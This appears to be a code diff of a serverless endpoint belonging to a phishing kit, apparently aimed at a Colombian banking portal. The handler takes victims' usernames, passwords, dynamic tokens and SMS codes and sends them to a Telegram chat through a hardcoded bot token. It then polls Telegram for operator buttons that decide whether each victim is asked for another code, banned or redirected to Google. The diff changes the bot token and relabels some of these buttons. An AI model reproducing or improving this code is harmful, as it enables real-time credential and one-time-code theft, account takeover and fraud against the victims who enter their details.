@@ -1,6 +1,6 @@
 // api/send.js
 export default async function handler(req, res) {
-  // Configurar CORS para evitar bloqueos
+  // Configurar CORS
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
@@ -10,13 +10,11 @@ export default async function handler(req, res) {
     return res.status(200).end();
   }
 
-  // Credenciales de Telegram
-  const TG_BOT_TOKEN = '8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8';
+  // ⚠️ VERIFICA QUE ESTOS DATOS SEAN CORRECTOS
+  const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
   const TG_CHAT_ID = '7776240161';
 
-  // ==========================================
-  // ESCUCHAR RESPUESTAS DE LOS BOTONES (GET)
-  // ==========================================
+  // 1. ESCUCHAR RESPUESTAS DE LOS BOTONES (GET)
   if (req.method === 'GET') {
     const { offset } = req.query;
     const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${offset || -1}&allowed_updates=["callback_query"]`;
@@ -26,13 +24,11 @@ export default async function handler(req, res) {
       const data = await response.json();
       return res.status(200).json(data);
     } catch (error) {
-      return res.status(500).json({ error: error.message });
+      return res.status(500).json({ ok: false, error: "Error en GET a Telegram", details: error.message });
     }
   }
 
-  // ==========================================
-  // ENVIAR MENSAJES (POST)
-  // ==========================================
+  // 2. ENVIAR MENSAJES (POST)
   if (req.method === 'POST') {
     const { tipoDoc, usuario, clave, dynamicCode, smsCode, action } = req.body;
     const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
@@ -44,15 +40,15 @@ export default async function handler(req, res) {
       mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
       keyboard = {
         inline_keyboard: [
-          [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
+          [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Token', callback_data: 'pedir_dinamica' }],
           [{ text: '🚫 Banear IP', callback_data: 'banear_ip' }, { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
         ]
       };
     } else if (action === 'dinamica') {
-      mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔢 <b>Dinámica:</b> <code>${dynamicCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
+      mensaje = `⚡ <b>PORTAL - TOKEN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔢 <b>Token:</b> <code>${dynamicCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
       keyboard = {
         inline_keyboard: [
-          [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
+          [{ text: '❌ Error Token', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
           [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
         ]
       };
@@ -60,7 +56,7 @@ export default async function handler(req, res) {
       mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n📩 <b>SMS:</b> <code>${smsCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
       keyboard = {
         inline_keyboard: [
-          [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
+          [{ text: '❌ Error Token', callback_data: 'error_dinamica_final' }],
           [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
           [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
         ]
@@ -82,9 +78,9 @@ export default async function handler(req, res) {
       const data = await tgResponse.json();
       return res.status(200).json(data);
     } catch (error) {
-      return res.status(500).json({ error: error.message });
+      return res.status(500).json({ ok: false, error: "Error en POST a Telegram", details: error.message });
     }
   }
 
-  return res.status(405).json({ error: 'Método no permitido' });
+  return res.status(405).json({ ok: false, error: 'Método no permitido' });
 }
